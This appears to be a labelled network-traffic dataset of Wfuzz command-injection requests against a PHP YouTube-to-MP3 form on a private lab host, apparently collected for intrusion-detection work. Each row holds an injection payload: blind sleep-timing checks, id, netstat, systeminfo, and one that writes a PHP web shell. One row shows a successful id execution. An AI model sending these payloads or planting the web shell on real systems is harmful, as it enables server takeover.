cmdinj,192.168.1.34,80,ytlink=%7C%20%5B%205%20-ne%20%24%28echo%20ZDEVVW%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%27&send=send,*/*,139,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:49 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61404
cmdinj,192.168.1.34,80,ytlink=%3B%20str%3D%24%28echo%20YBRDJI%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%5C%5C&send=send,*/*,186,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:50 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61405
cmdinj,192.168.1.34,80,ytlink=%3B%20str%3D%24%28echo%20OKKNHF%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%7C&send=send,*/*,183,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:52 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61406
cmdinj,192.168.1.34,80,ytlink=%7C%20%5B%207%20-ne%20%24%28echo%20CXWPXJ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%255C%255C&send=send,*/*,146,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:52 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61407
cmdinj,192.168.1.34,80,ytlink=%7C%20%5B%201%20-ne%20%24%28echo%20FTWOKG%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%257C&send=send,*/*,141,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:53 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61408
cmdinj,192.168.1.34,80,ytlink=%27%0A%20str%3D%24%28echo%20LMRVVK%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27&send=send,*/*,186,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:53 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61410
cmdinj,192.168.1.34,80,ytlink=%27%3B%20str%3D%24%28echo%20ERVJHE%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%5C%5C&send=send,*/*,189,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:53 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61411
cmdinj,192.168.1.34,80,ytlink=%27%0A%20str%3D%24%28echo%20GIPRGX%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%26&send=send,*/*,186,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:53 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61412
cmdinj,192.168.1.34,80,ytlink=%27%0A%20str%3D%24%28echo%20GZKCJA%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%255C%255C&send=send,*/*,193,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:54 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61413
cmdinj,192.168.1.34,80,ytlink=%27%0A%20str%3D%24%28echo%20ROEZHE%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%257C&send=send,*/*,188,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:54 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61414
cmdinj,192.168.1.34,80,ytlink=%22%0A%20str%3D%24%28echo%20ROWALZ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27&send=send,*/*,186,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:54 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61415
cmdinj,192.168.1.34,80,ytlink=%22%7C%20%5B%204%20-ne%20%24%28echo%20YPWXZB%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%5C%5C&send=send,*/*,145,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:55 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61416
cmdinj,192.168.1.34,80,ytlink=%22%3B%20str%3D%24%28echo%20GRQQCI%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527&send=send,*/*,188,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:55 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61417
cmdinj,192.168.1.34,80,ytlink=%0Aid&send=send,*/*,22,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"uid=33(www-data) gid=33(www-data) groups=33(www-data)   <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,333,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:55 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61418
cmdinj,192.168.1.34,80,"ytlink=; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php&send=send",*/*,66,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:56 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61419
cmdinj,192.168.1.34,80,ytlink=&& netstat -an&send=send,*/*,31,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:57 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61421
cmdinj,192.168.1.34,80,ytlink=; sleep 15&send=send,*/*,27,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:57:12 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61423
cmdinj,192.168.1.34,80,ytlink=& systeminfo&send=send,*/*,29,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:57:07 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61424
cmdinj,192.168.1.34,80,ytlink=a)|/usr/bin/id&send=send,*/*,31,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:57:36 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61428
